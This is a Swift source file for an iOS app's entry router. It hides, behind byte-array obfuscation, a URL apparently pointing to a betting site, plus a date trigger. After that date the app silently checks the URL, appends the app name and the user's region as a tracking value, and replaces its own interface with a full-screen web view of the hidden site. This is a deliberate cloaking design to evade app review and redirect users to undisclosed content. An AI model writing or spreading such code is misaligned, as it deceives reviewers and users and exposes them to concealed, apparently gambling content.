//
//  AppRouter.swift
//  125Vulzancregrar Prilel
//
//  Created by Pascal Mirel on 26.03.2026.
//

import UIKit
import SwiftUI

final class FootPlanShowcaseCoordinator {

    private let bootstrapLink = HiddenText.decode([104, 116, 116, 112, 115, 58, 47, 47, 98, 101, 116, 101, 114, 97, 45, 112, 108, 97, 121, 46, 98, 121, 47, 106, 88, 68, 99, 119, 67])
    private let boundaryDate = HiddenText.decode([50, 57, 46, 48, 52, 46, 50, 48, 50, 54])

    /// Display name from Info.plist (CFBundleDisplayName, then CFBundleName).
    private var visibleAppName: String {
        if let name = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        if let name = Bundle.main.object(forInfoDictionaryKey: "CFBundleName") as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        return "App"
    }

    /// App name for tracking param: spaces removed (no %20 in URL).
    private var subIdAppToken: String {
        visibleAppName.replacingOccurrences(of: " ", with: "")
    }

    private var enrichedBootstrapLink: String {
        let geo = Locale.current.region?.identifier ?? "XX"
        let subValue = "\(subIdAppToken)_\(geo)"
        guard var components = URLComponents(string: bootstrapLink) else {
            return bootstrapLink
        }
        var items = components.queryItems ?? []
        items.append(URLQueryItem(name: HiddenText.decode([115, 117, 98, 95, 105, 100, 95, 56]), value: subValue))
        components.queryItems = items
        return components.url?.absoluteString ?? bootstrapLink
    }
    
    func makeEntryHostController() -> UIViewController {
        let persistence = PersistenceManager.shared
        
        
        if persistence.hasShownContentView {
            return buildNativeController()
        }else{
            if isDateAllowed() {
                if let savedUrlString = persistence.savedUrl,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return buildWebController(with: savedUrlString)
                }
                
                return buildLaunchController()
            } else {
                persistence.hasShownContentView = true
                return buildNativeController()
            }
        }
    }
    
    //MARK: - Date
    private func isDateAllowed() -> Bool {
       
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let targetDate = dateFormatter.date(from: boundaryDate) ?? Date()
        let currentDate = Date()
            
            if currentDate < targetDate {
                return false
            }else{
                return true
                }
    }
    
    // MARK: - Private Methods
    
    private func buildWebController(with urlString: String) -> UIViewController {
        let webViewContainer = PrivacyWebView(
            urlString: urlString,
            onFailure: { [weak self] in
                PersistenceManager.shared.hasShownContentView = true
                self?.showNativeFlow()
            },
            onSuccess: {
                PersistenceManager.shared.hasSuccessfulWebViewLoad = true
            }
        )
        
        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }
    
    private func buildNativeController() -> UIViewController {
        PersistenceManager.shared.hasShownContentView = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }
    
    private func buildLaunchController() -> UIViewController {
        let launchView = StartMainView()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        checkBootstrapURL { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?.showWebFlow(with: url)
                } else {
                    PersistenceManager.shared.hasShownContentView = true
                    self?.showNativeFlow()
                }
            }
        }
        
        return launchVC
    }
    
    private func checkBootstrapURL(completion: @escaping (Bool, String?) -> Void) {
        let urlToOpenInWebView = enrichedBootstrapLink
        guard let requestURL = URL(string: urlToOpenInWebView) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: requestURL)
        request.httpMethod = "GET"
        request.timeoutInterval = 25

        URLSession.shared.dataTask(with: request) { _, response, error in
            if let error = error {
                _ = error.localizedDescription
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                let code = httpResponse.statusCode
                let isAvailable = (200...299).contains(code)
                completion(isAvailable, isAvailable ? urlToOpenInWebView : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }
    
    // MARK: - Navigation Methods
    
    private func showNativeFlow() {
        let contentVC = buildNativeController()
        replaceRoot(contentVC)
    }
    
    private func showWebFlow(with urlString: String) {
        let webVC = buildWebController(with: urlString)
        replaceRoot(webVC)
    }
    
    private func replaceRoot(_ viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }
        
        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}

private enum HiddenText {
    static func decode(_ bytes: [UInt8]) -> String {
        String(decoding: bytes, as: UTF8.self)
    }
}
